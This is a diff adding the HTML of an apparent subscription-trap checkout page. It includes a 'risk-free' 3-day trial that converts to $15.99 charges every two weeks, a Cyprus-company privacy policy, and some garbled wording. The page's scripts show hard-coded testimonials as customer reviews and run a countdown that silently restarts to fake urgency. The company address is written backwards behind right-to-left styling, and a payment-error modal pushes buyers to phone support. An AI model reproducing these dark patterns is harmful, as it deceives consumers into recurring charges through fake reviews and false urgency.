dollar&quot;,&quot;symbol&quot;:&quot;$&quot;,&quot;symbol_position&quot;:&quot;before&quot;,&quot;symbol_separator&quot;:&quot;&quot;,&quot;thousands_separator&quot;:&quot;,&quot;,&quot;decimal_separator&quot;:&quot;.&quot;,&quot;round_short&quot;:0,&quot;is_automatic_rate_update&quot;:1,&quot;created_at&quot;:&quot;2020-07-27T12:46:15.000000Z&quot;,&quot;updated_at&quot;:&quot;2020-07-27T12:46:15.000000Z&quot;},&quot;concept_subscription&quot;:{&quot;id&quot;:2002,&quot;concept_id&quot;:295,&quot;subscription_id&quot;:6,&quot;charging_interval_id&quot;:2,&quot;price&quot;:43,&quot;credits&quot;:43,&quot;tier&quot;:5,&quot;created_at&quot;:&quot;2021-11-11T15:45:07.000000Z&quot;,&quot;updated_at&quot;:&quot;2022-04-20T10:23:24.000000Z&quot;}}
+                        </p>
+
+                                                <p style="color: gray; font-size: .7rem; text-align:justify">
+                            We offer our service not only with responsibility but also with great joy and excitement. We strive for the satisfaction of our customers and we take pride in giving you the best service. We ensure that our service is delivered in time and get the best from our customers.<br /><br /> 
+We will be letting you start your free membership today and start your order today once processed. After 3 days, if you wish to continue the WowDeals service, your credit or debit card will be charged automatically just the venn current charge of $15.99 (USD) every 2 weeks. Now if you decide that the program is not for you, just call our customer service number to cancel within the period of your trial and you won't be charged a penny more! <br /><br /> 
+We offer new users the opportunity to participate in our risk-free membership and send out your free welcome offer gift! This special offer gives you the opportunity of becoming a member and tries out full access for 3 days at no cost. After this period, you will become a full member enrolled in the automatic recurrent payment every two weeks, which is $15.99. Don't worry! You can always cancel if you unexpectedly charged. Refunds available within 1 day of being charged.<br /><br /> 
+Once the payment has been processed, it could be refunded before 1 day of the subscription billing date. Your membership services will be available immediately until cancelled. You can cancel your membership anytime by giving us a call. As a valued member, you will be able to enjoy exclusive deals, incentives, rewards, benefits, gifts, and many more. <br /><br />
+ 
+You will be billed by BILLINGCARE. For any questions, please contact our customer support for United States 838-228-1171 or 778-801-4594 for anywhere inside of Canada..
+                        </p>
+                                            </div>
+                </div>
+            </section>
+        </div>
+    </div>
+
+    <div class="footer">
+
+
+        <div class="banner col-12 d-flex ">
+            <p style="text-align:center!important;">
+                BILLINGCARE
+            </p>
+                        <p style="text-align:center!important;">
+                - USA -
+            </p>
+            
+            <p style="text-align:center!important;">
+                - Customer care: +1 838-228-1171 -
+            </p>
+            </p>
+                        <p style="text-align:center!important;">
+        © 2023
+            </p>
+        </div>
+
+
+        <div class="banner col-12">
+                        <a data-toggle="modal" id="#modalPrivacy" data-target="#modalPrivacy" class="text-body" style="font-size:12px;opacity: .8;" href="#" type="button">Privacy policy</a>
+        </div>
+
+
+
+
+    </div>
+    <div class="modal fade" id="modalPrivacy" tabindex="-1" role="dialog" aria-hidden="true">
+        <div class="modal-dialog modal-lg" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">&times;</span>
+                    </button>
+                </div>
+                <div class="modal-body" style="height:auto;">
+                                        <style>
+    .rtl {
+		unicode-bidi: bidi-override;
+		direction: rtl;
+	}
+</style>
+
+<h1 style="margin-left: 0">
+    PRIVACY POLICY<br>
+</h1>
+
+<p>
+    Below, you can read about Gadgetgeek.store ’s policy for processing the personal information submitted by you when navigating Gadgetgeek.store’s website or signing up for our news services (electronic mail).
+</p>
+
+<p>
+    Any navigation of Gadgetgeek.store’s website or signing up for ’s news services is subject to the terms and conditions of this present data protection policy. Any navigation of the website is further subject to Gadgetgeek.store’s cookie policy. If you cannot accept the following terms and conditions, please do not use Gadgetgeek.store’s website and/or news services.
+</p>
+
+<p>
+    Nilby Trading Ltd protects your personal information, being aware of the requirement for appropriate protection and proper processing of any personal information obtained from you.
+</p>
+
+<p>
+    Nilby Trading Ltd is deemed to be the data controller under the current statutes on personal data. Below, you can find all the required contact details:<br>
+    Nilby Trading Ltd<br>
+    Company Reg.no HE424410<br>
+   <span class="rtl m-0" dir="rtl" data-info="rtl" >A8 saetnoK</span>  –  Limassol, Cyprus 3120.
+</p>
+
+<p>
+    1. Nilby Trading Ltd collection of your personal information
+</p>
+
+<p>
+    Nilby Trading Ltd’s processing of your personal information is in line with the requirements prevailing at any time, including the safety requirements resulting from the data protection legislation and the related orders. Nilby Trading Ltd’s reviews regularly the registered personal information, erasing information that is no longer relevant. The same applies to personal information, which a user wishes to delete, and which Nilby Trading Ltd’s has no longer any basis for processing.
+</p>
+
+<p>
+    When using our website or signing up for our news services, you are required to submit certain personal information. This is necessary in order for you to use the full functionality of the website and for us to be able to send you relevant newsletters etc. Consequently, Nilby Trading Ltd’s  collects and registers the personal information provided by you on Nilby Trading Ltd’s  website in connection with your use of the website and when signing up for our news services.
+</p>
+
+<p>
+    2. What information is collected?
+</p>
+
+<p>
+    Whenever you visit our website, the following information about you will be collected:
+</p>
+
+<ol>
+    <li>
+        Any pages visited by you with indication of the date and time of your visit – your “electronic track”;
+    </li>
+
+    <li>
+        Any browser used by you;
+    </li>
+
+    <li>
+        Any ip address used by you;
+    </li>
+
+    <li>
+        Any user name;
+    </li>
+</ol>
+
+<p>
+    The above information is obtained by means of cookies, so reference is made to the cookie policy concerned, containing a detailed description of the terms and conditions for obtaining, storing, disclosing and erasing the above information. Our cookie policy is always fully accessible on Nilby Trading Ltd’s website, and further, you will be asked to accept our cookie policy, when connecting to our website.
+</p>
+
+<p>
+    In order for us to be able to supply our news services to you, Nilby Trading Ltd’s also processes the following personal information about you:
+</p>
+
+<p>
+    Contact details:<br>
+    - Name<br>
+    - Email address
+</p>
+
+<p>
+    3. Purpose of collection and storing period
+</p>
+
+<p>
+    Nilby Trading Ltd’s collects your contact details when you sign up for our news services for the purpose of completing your registration and delivering relevant newsletters, marketing by means of emails and text messages to you, and further, we collect them for the purpose of creating your membership with Nilby Trading Ltd’s.
+</p>
+
+<p>
+    The personal information is processed for the purpose of delivery to you of the products ordered and sending electronic mail to you, including newsletters and any other relevant marketing concerning products, campaigns, press releases, invitations for events/seminars/fairs and competitions.
+</p>
+
+<p>
+    Nilby Trading Ltd’s stores your personal information only for as long as this is necessary to comply with the above purposes. This means that we store the above personal information, for as long as you are still registered with Gadgetgeek.store's news services and/or has a membership with Nilby Trading Ltd’s. If you deregister this/these service(s), Nilby Trading Ltd’s will erase your personal information within 30 days.
+</p>
+
+<p>
+    4. Disclosure of your personal information
+</p>
+
+<p>
+    Your personal information will not be disclosed to any third party, except if so required under current statutes, or if determined by court order.
+</p>
+
+<p>
+    As for erasure and disclosure of the personal information provided by you when navigating the website, reference is made to the cookie policy.
+</p>
+
+<p>
+    5. Use of data processors
+</p>
+
+<p>
+    The above personal information may be entrusted to the data processors attached to Nilby Trading Ltd’s. The data processors handle your personal information upon instruction from Nilby Trading Ltd’s and thus only for specific purposes disclosed in this policy. Further, the data processors are subject to the same obligation for protecting personal information as that applying to Nilby Trading Ltd’s.
+</p>
+
+<p>
+    6. Safety concerning your personal information
+</p>
+
+<p>
+    Nilby Trading Ltd’s shall observe confidentiality in respect of all personal information, and we have taken a number of technical, organizational safety measures for the purpose of protecting personal information against accidental loss or illegal destruction, forfeiture or deterioration and preventing it from being brought to the knowledge of any unauthorised persons or from being misused or otherwise processed contrary to the Data Protection Act in Cyprus.
+</p>
+
+<p>
+    All our electronic data are subject to daily back-ups, and we have protected ourselves, among other things, by installing antivirus software and firewalls.
+</p>
+
+<p>
+    7. Your Information and Rights
+</p>
+
+
+<p>
+    You can request access to your personal information, or correct or update out-of-date or inaccurate personal information we hold about you. You may also request that we delete personal information that we hold about you.
+</p>
+
+<p>
+    You can object to processing of your personal information, ask us to restrict processing of your personal information or request portability of your personal information; if we have collected and process your personal information with your consent, then you can withdraw your consent at any time; withdrawing your consent will not affect the lawfulness of any processing we conducted prior to your withdrawal, nor will it affect processing of your personal information conducted in reliance on lawful processing grounds other than consent; you have the right to complain to a data protection authority about our collection and use of your personal information.
+</p>
+
+<p>
+    We may retain information as required or permitted by applicable laws and regulations, including to honor your choices, for our billing or records purposes and to fulfill the purposes described in this Privacy Statement. We take reasonable measures to destroy or de-identify personal information in a secure manner when it is no longer required.
+</p>
+
+<p>
+    We respond to all requests we receive from individuals wishing to exercise their data protection rights in accordance with applicable data protection laws.
+</p>
+
+<p>
+    8. Contact us
+</p>
+
+<p>
+    If you have any questions about this Privacy Policy, please contact us at <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f2818782829d8086b295939695978695979799dc81869d8097">[email&#160;protected]</a>.
+</p>
+                </div>
+            </div>
+        </div>
+    </div>
+                                                                                        <style>
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 999;
+            cursor: pointer;
+            background-color: rgba(0,0,0,0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-content {
+            background-color: white;
+            border: 1px solid lightgray;
+            border-radius: .3em;
+            cursor: initial;
+            padding: 1rem;
+            width: 90%;
+            max-width: 750px;
+        }
+        .modal-header {
+            width: 100%;
+            display: flex;
+        }
+        .modal-body {
+            width: 100%;
+            height: 600px;
+        }
+        #preflightDDModal .modal-body {
+            height: auto;
+        }
+    </style>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body>
+
+<div class="modal" id="preflightDDModal" tabindex="-1" role="dialog" data-backdrop="static" data-keyboard="false">
+    <div class="modal-dialog" role="document">
+        <div class="modal-content">
+            <div class="modal-body">
+                <h1 style="text-align: center; font-size: 26px;margin-bottom:20px">Secure Payment</h1>
+                <div class="alert alert-danger">
+                    <p class="text-center">
+                        <strong>There was an error while handling the payment!</strong>
+                    </p>
+                    <hr>
+                    <div style="display: flex;align-items: center;">
+                        <img src="/storage/4e6b9c9e-f355-4daf-8c46-b2ea72256715/ca.webp?v=884f56e8b03acff507178676a97a74d3279a205e" class="img-fluid" alt="ca" style="max-height:70px; border-radius:50%;margin-right:15px">
+                        <p class="text-left" style="margin:0;">
+
+                            Please contact our support service to help you proceed with your purchase
+                        </p>
+                    </div>
+                    <hr>
+                    <div>
+                        <p>
+                            Possible reasons:
+                        </p>
+                        <ul>
+                            <li>The account holder is incorrect</li>
+                            <li>The country selected and the bank account do not match</li>
+                            <li>The respective bank is not supported</li>
+                        </ul>
+                                                                                                                                            </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+<script>
+    function startTimer(duration, display) {
+        var timer = duration,
+        minutes,
+        seconds;
+        setInterval(function() {
+            minutes = parseInt(timer / 60, 10);
+            seconds = parseInt(timer % 60, 10);
+            minutes = minutes < 10 ? "0" + minutes: minutes;
+            seconds = seconds < 10 ? "0" + seconds: seconds;
+            display.text(minutes + ":" + seconds);
+            if (--timer < 0) {
+                timer = duration;
+            }
+        },
+            1000);
+    }
+    window.onload = function() {
+        var fiveMinutes = 60 * 5,
+        display = $(".time-left");
+        startTimer(fiveMinutes,
+            display);
+    };
+</script>
+<script>
+    var interval = setInterval(function() {
+        if ($('.wpwl-control-cvv').length >= 1) {
+            $('.wpwl-control-cvv').after(`<img height="30" style="margin: 0px 10px" src="/storage/140235ba-db7f-4a22-9e05-2686dce6fd8c/cvv-icon.jpg?v=784d70b3e057b6d5fb4eb229779e0daa616bfda6" /><p style="font-size: .8rem; color: grey">3 digits on the back of your card</p>`);
+            clearInterval(interval)
+        }
+    }, 100);
+</script>
+<script>
+
+    var reviews = [{
+        id: 1,
+        name: "Fenella Lara",
+        text:
+        "I received my product yesterday. Fast and outstanding customer service! Thanks a lot <3."
+    },
+        {
+            id: 2,
+            name: "Maison Parry",
+            text:
+            "Fast and easy to use"
+        },
+        {
+            id: 3,
+            name: "Riaan Burt",
+            text:
+            "I got an amazing product only 2 days after signing up! Everything was on point! :-)"
+        },
+        {
+            id: 4,
+            name: "Chelsea Howard",
+            text:
+            "Never have I spent my money that well. Great service and delivery.. Guess I was lucky this time! See you next time :)"
+        }];
+
+    var author = document.getElementById("author");
+    var info = document.getElementById("info");
+
+    var prevBtn = document.querySelector(".prev-btn");
+    var nextBtn = document.querySelector(".next-btn");
+
+    var currentItem = 0;
+
+    // load initial item
+    window.addEventListener("DOMContentLoaded", () => {
+        const item = reviews[currentItem];
+        author.textContent = item.name;
+        info.textContent = item.text;
+    });
+
+    // show person based on item
+    function showPerson(person) {
+        const item = reviews[person];
+        author.textContent = item.name;
+        info.textContent = item.text;
+    }
+
+    // show next person
+    nextBtn.addEventListener("click", () => {
+        currentItem++;
+        if (currentItem > reviews.length - 1) {
+            currentItem = 0;
+        }
+        showPerson(currentItem);
+    });
+
+    // show prev person
+    prevBtn.addEventListener("click", () => {
+        currentItem--;
+        if (currentItem < 0) {
+            currentItem = reviews.length - 1;
+        }
+        showPerson(currentItem);
+    });
+
+</script>
+
+ 
+<!-- VWO -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+<!-- new pixel -->
+
+
+
+
+
+
+
+    
+    
+    <!-- END new pixel -->
+</html>
